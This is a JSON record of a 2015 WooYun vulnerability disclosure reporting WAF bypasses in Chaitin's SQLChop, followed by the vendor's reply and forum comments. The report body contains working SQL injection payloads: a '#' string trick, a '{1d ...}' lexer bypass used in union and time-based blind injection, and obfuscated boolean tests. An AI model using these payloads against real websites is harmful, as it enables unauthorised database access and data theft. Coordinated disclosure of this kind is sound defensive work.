{"id": 27197, "wybug_id": "wooyun-2015-0126555", "wybug_title": "长亭科技sqlchop bypass", "wybug_corp": "chaitin.com", "wybug_author": "izy", "wybug_date": "2015-07-14 12:17", "wybug_open_date": "2015-07-14 12:53", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： T_T 详细说明：  First:对#的处理问题:   因为#是注释符，在语法分析中对此符号没有做好处理导致可被绕过。例如提交即可绕过:   test%23aaa' union select user(),2; \n\n只要我们在字符串中包含#这个字符就可以导致waf失效！这是非常严重的。。。Second:直接select{x user}from{x admin}这样是不行的但是fuzz了一下：    这样可以绕过：select{x user}from{1d admin}union:    union select (select{x user}from{1d admin}+limit+1),1盲注：    1' and if(ascii(substr((select{1d user()}),1,1))>11,sleep(1),1)同理报错注入也是可以的！关键点在1d这个地方！同样一点错误导致waf完全被绕过！注入的判断：     and--!!!1=- -!!!1     and--!!!1=- -!!!0or：     %26%261=1     %26%261=0     ||1=1还有些数据库特性：   1）：iis在asp程序处理中对于%的处理   2）：iis在aspx程序处理中对于%u00的处理    3）：select 1,2,3,4 from dual where id =1[]union[]select[]1,2,3,4 from[]\n\n一些小问题,感觉这样防御有点暴力：\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  语法分析思路很赞啊！   版权声明：转载请注明来源 izy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-14 12:48 厂商回复： 非常感谢乌云的报告。在收到报告后我们技术人员进行了分析，如下：使用语句test%23aaa' union select user(),2; 进行测试的时候显示Blocked。为了严谨，仔细核查日志,发现日志中语句test%23aaa' union select user(),2; 的所有测试也都是被拦截的。不知道是不是白帽子在测试的时候是不是因为网络导致显示的还是前一条的结果。为了避免再次让测试者误解，前端方面我们也会再努力去进行调整。关于1d的问题，词法分析实现时考虑了oracle db下对浮点数的处理，将1d处理为数字，于是我们在后端对1d进行了特殊处理以至于出现这种bug。除白帽子报告的1d以外，还有1f也有这个问题。在下一版本中我们会进行一些完善。由于考虑到union注入可能导致非常严重的后果，于是之前的实现中对这部分做了严格的处理。关于uddddnion dd误报的问题在下一版本中会综合实际情况考虑进行一些调整。再次感谢白帽子报告问题。 最新状态： 2015-07-14：现在公开供大家学习，下一版本中统一修复。  ", "replys": "漏洞评价：\n评论\n     2015-07-14 10:15 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  前排挤挤围观怎么绕~    \n     2015-07-14 10:18 |    \t\tflsf \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 没事儿,小钱儿)\t\t \n  围观    \n     2015-07-14 11:06 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  围观！！！！    \n     2015-07-14 11:07 |    \t\t小博博 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:9        | .)\t\t \n  打脸啊    \n     2015-07-14 11:08 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  说好了永别了SQL注入呢？攻陷长亭，活捉肉肉！！！！    \n     2015-07-14 11:08 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  庆幸不是阿里峰会的时候被人发出来吧那就呵呵哒了    \n     2015-07-14 11:09 |    \t\tyunxu \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | 呵呵哒)\t\t \n  打脸了!    \n     2015-07-14 11:09 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  肉肉V表示不服    \n     2015-07-14 11:10 |    \t\tJiuShao \t\t\t( 普通白帽子  |\t\t\t        Rank:405 漏洞数:94        | ╮(╯▽╰)╭锄禾日当午)\t\t \n  说好了永别了SQL注入呢？攻陷长亭，活捉肉肉！！！！    \n     2015-07-14 11:10 |    \t\tmtfly \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:6        | 啥都不会)\t\t \n  赶紧公布了吧。    \n     2015-07-14 11:17 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  说好了永别了呢……    \n     2015-07-14 11:20 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  活该，真能装逼    \n     2015-07-14 11:22 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  永别...    \n     2015-07-14 11:25 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  啪啪    \n     2015-07-14 11:28 |    \t\ticeks \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 你是我的小呀小苹果~)\t\t \n  这个逼装的可以    \n     2015-07-14 11:42 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  攻破长亭 活捉肉肉    \n     2015-07-14 11:43 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  不要乱喷吖，兄弟们    \n     2015-07-14 11:54 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  @浩天 我错了.... 没想到。。。。完了。。。T_T    \n     2015-07-14 12:01 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  希望不是标题党…… 坐等公开！    \n     2015-07-14 12:54 |    \t\t北京长亭科技有限公司(乌云厂商)\t\t \n  关于永别了这个问题，欢迎大家先看PPT啊。看完后大家觉得有什么问题，非常欢迎来交流哦。    \n     2015-07-14 13:10 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  唉，好疼！！！    \n     2015-07-14 13:15 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  wooyun最佳厂商回复，学习了！如楼上说的小伙伴们去找阿里演讲的PPT或者视频看看，在演讲中死猫大人对\"永别了\"这个说法有说明的，好像不是字面理解的那样……    \n     2015-07-14 13:40 |    \t\tMayIKissYou \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:33        | 勿忘初心)\t\t \n  1d这个有点6 = = 厉害啊    \n     2015-07-14 14:05 |    \t\tBraveRT \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 好！)\t\t \n  永别SQL注入表示不服    \n     2015-07-14 15:14 |    \t\tDark4ce \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:4        )\t\t \n  永远有比你牛的人，话不要说的太满，脸被打的啪啪的例子那么多，就不懂得低调些！    \n     2015-07-14 15:42 |    \t\tqdq \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 有关部门)\t\t \n  @all 大家别上当，长亭其实是来偷payload的    \n     2015-07-14 18:36 |    \t\t一个狗 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:3        | ADoG)\t\t \n  关于“永别了”这个说法，我当时在阿里安全峰会有讲，意思是说只有大家都来努力提升防护技术水平，才可能把 SQ 注入防护提升到很高的水平，让 SQL 注入这种攻击的门槛和成本变得相当高，这样的话，才能在一定程度上和 SQL 注入说再见。“永别了”是一个美好的愿景，并不是说我们的 SQLChop 现在就已经完美无缺，SQLChop 也需要大家的帮助来慢慢改进。可重点是我们的确通过自己的努力，用新的思路把 SQL 注入的系统性防护水平提到了一个更高的水平，我们希望倡导的是大家努力来推进防护水平的技术进步，不然大家整天就是改来改去一些正则表达式（而且正则防护系统在理论上就是有先天缺陷的），有什么意思呢？    \n     2015-07-15 10:36 |    \t\tG9sT的测试 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我不是roots01)\t\t \n  话说求教sqlchop怎么用的?    \n     2015-07-15 15:05 |    \t\tzhighest \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | ....)\t\t \n  还是360网站宝靠谱啊，一个select关键字就拦截了...    \n     2015-07-16 18:07 |    \t\txy小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:50        | 成为海贼王的男人)\t\t \n  啪啪啪打脸了，好痛    \n     2015-07-24 23:17 |    \t\tkris \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        | 我很单纯但很热情。)\t\t \n  楼上好幽默(*^__^*)     \n     2015-08-07 11:28 |    \t\tmantis \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 一萧一剑走江湖，千古情愁尿一壶)\t\t \n  厂商这回复真尼玛机智，以后所有厂商都可以参照    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}